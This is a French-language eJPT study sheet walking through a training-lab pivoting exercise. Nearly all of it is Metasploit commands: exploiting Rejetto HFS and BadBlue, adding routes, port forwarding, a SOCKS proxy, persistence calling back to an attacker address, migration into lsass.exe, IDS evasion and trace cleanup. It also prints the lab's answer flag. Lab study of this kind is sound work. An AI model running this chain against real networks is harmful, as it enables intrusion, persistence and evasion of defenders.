# 🎯 Framework d'analyse Pivoting - Éléments clés eJPT

## 📋 Vue d'ensemble de la démarche Pivoting

### **Définition du Pivoting**
Le pivoting consiste à utiliser une machine compromise comme point de relais pour accéder à des réseaux ou machines autrement inaccessibles depuis l'attaquant initial.

---

## 🔍 **Phase 1 : Reconnaissance et identification du contexte**

### **1.1 Reconnaissance initiale des cibles**
```bash
# Test de connectivité directe
ping -c 4 demo1.ine.local    # Machine accessible
ping -c 4 demo2.ine.local    # Machine NON accessible

# Scan réseau depuis l'attaquant
nmap demo1.ine.local
nmap demo2.ine.local         # Timeout/échec attendu
```

### **1.2 Identification de l'architecture réseau**
- **Machine attaquante** : Kali Linux (réseau externe)
- **Machine pivot** : demo1.ine.local (accessible depuis l'extérieur)  
- **Machine cible** : demo2.ine.local (accessible uniquement depuis le réseau interne)

### **1.3 Éléments à identifier pour le pivoting**
| Élément | Description | Méthode de découverte |
|---------|-------------|---------------------|
| **Topologie réseau** | Segments réseau accessibles | `ipconfig`, `route`, `arp -a` |
| **Interfaces réseau** | Cartes réseau de la machine pivot | `ipconfig /all` |
| **Plages IP internes** | Réseaux privés découvrables | Analyse des routes et ARP |
| **Services internes** | Ports ouverts sur machines internes | Port scanning via pivot |
| **Protocoles disponibles** | TCP, UDP, ICMP accessibles | Tests de connectivité |

---

## 🚀 **Phase 2 : Exploitation de la machine pivot**

### **2.1 Identification du service vulnérable**
```bash
# Scan de version du service
nmap -sV -p80 demo1.ine.local

# Résultat : Rejetto HTTP File Server (HFS)
# Recherche d'exploits
searchsploit hfs
```

### **2.2 Exploitation avec Metasploit**
```bash
# Configuration de l'exploit
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo1.ine.local
exploit

# Vérification du succès
ipconfig                     # Depuis la session Meterpreter
```

### **2.3 Éléments critiques post-exploitation**
- **Type de session** : Meterpreter (privilégié pour pivoting)
- **Privilèges obtenus** : Utilisateur/SYSTEM
- **Stabilité de la session** : Maintien de la connexion
- **Capacités réseau** : Accès routing et forwarding

---

## 🔄 **Phase 3 : Configuration du pivot**

### **3.1 Reconnaissance réseau depuis la machine pivot**
```bash
# Dans la session Meterpreter
ipconfig                     # Identification des interfaces
route                        # Table de routage
arp -a                       # Cache ARP pour discovery

# Exemple de résultat
# Interface 1: 192.168.1.100 (réseau externe)
# Interface 2: 10.0.19.50 (réseau interne)
```

### **3.2 Configuration des routes**
```bash
# Ajout de route automatique
run autoroute -s 10.0.19.0/20

# Vérification de la route
run autoroute -p

# Alternative manuelle
route add 10.0.19.0 255.255.240.0 1  # Session ID 1
```

### **3.3 Découverte des cibles internes**
```bash
# Port scanning via pivot
background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit

# Host discovery si IP inconnue
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 10.0.19.0/24
exploit
```

---

## 🌉 **Phase 4 : Techniques de forwarding**

### **4.1 Port forwarding local**
```bash
# Retour à la session pivot
sessions -i 1

# Forward port 80 de demo2 vers port local 1234
portfwd add -l 1234 -p 80 -r <IP_demo2>
portfwd list

# Test depuis l'attaquant
nmap -sV -sS -p 1234 localhost
```

### **4.2 Port forwarding remote**
```bash
# Forward port local vers machine interne
portfwd add -R -l 4444 -p 4444 -L <attacker_ip>

# Useful pour reverse shells
```

### **4.3 SOCKS proxy (avancé)**
```bash
# Configuration proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# Configuration dans l'environnement
export http_proxy=socks://127.0.0.1:1080
export https_proxy=socks://127.0.0.1:1080
```

---

## 🎯 **Phase 5 : Exploitation de la cible finale**

### **5.1 Identification du service sur la cible finale**
```bash
# Via le port forward configuré
nmap -sV -sS -p 1234 localhost

# Résultat : BadBlue HTTPd 2.7
# Recherche d'exploits
searchsploit badblue 2.7
```

### **5.2 Configuration de l'exploit pour la cible finale**
```bash
# Nouvel exploit module
background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit
```

### **5.3 Accès final et collecte**
```bash
# Session sur la cible finale
shell
cd /
dir
type flag.txt

# Flag : c46d12f28d87ae0b92b05ebd9fb8e817
```

---

## 🔧 **Éléments techniques critiques**

### **Gestion des sessions multiples**
```bash
# Visualisation des sessions
sessions -l

# Session 1: Machine pivot (demo1)
# Session 2: Machine cible (demo2)

# Interaction avec sessions spécifiques
sessions -i 1    # Pivot
sessions -i 2    # Cible finale
```

### **Maintien de la persistance**
```bash
# Dans la session pivot
run persistence -S -U -i 10 -p 443 -r <attacker_ip>

# Migration de processus pour stabilité
migrate -N lsass.exe
```

### **Nettoyage des traces**
```bash
# Suppression des routes
route delete 10.0.19.0 255.255.240.0

# Nettoyage port forwarding
portfwd delete -l 1234 -p 80 -r <target_ip>
```

---

## ⚠️ **Points d'attention et bonnes pratiques**

### **Sécurité opérationnelle**
- Maintenir la session pivot stable
- Éviter la détection par IDS/IPS
- Limiter le bruit réseau
- Documenter les routes configurées

### **Gestion des erreurs communes**
- Session pivot fermée inopinément
- Conflits de ports dans le forwarding
- Routes mal configurées
- Timeouts réseau

### **Optimisation des performances**
- Utiliser des sessions Meterpreter pour le pivot
- Configurer des timeouts appropriés
- Limiter le nombre de connexions simultanées
- Préférer TCP bind aux reverse shells si possible

---

## 📊 **Matrice des techniques de pivoting**

| Technique | Complexité | Furtivité | Performance | Usage eJPT |
|-----------|------------|-----------|-------------|------------|
| **Port Forward Local** | 🟢 Faible | 🟡 Moyenne | 🟢 Haute | ✅ Priorité 1 |
| **Port Forward Remote** | 🟡 Moyenne | 🟡 Moyenne | 🟢 Haute | ✅ Utile |
| **SOCKS Proxy** | 🔴 Élevée | 🟢 Haute | 🟡 Moyenne | ❓ Avancé |
| **SSH Tunneling** | 🟡 Moyenne | 🟢 Haute | 🟢 Haute | ❓ Si SSH dispo |
| **HTTP Tunneling** | 🔴 Élevée | 🟢 Très haute | 🔴 Faible | ❌ Complexe |

---

## 🚀 **Workflow résumé pour eJPT**

### **Ordre d'exécution recommandé**
1. **Reconnaissance** → Identifier machines accessibles/non-accessibles
2. **Exploitation pivot** → Compromettre machine intermédiaire
3. **Route discovery** → `run autoroute -s network/mask`
4. **Port scanning** → Scanner les machines internes
5. **Port forwarding** → `portfwd add -l local -p remote -r target`
6. **Exploitation finale** → Attaquer via le tunnel
7. **Collecte** → Récupérer flags/données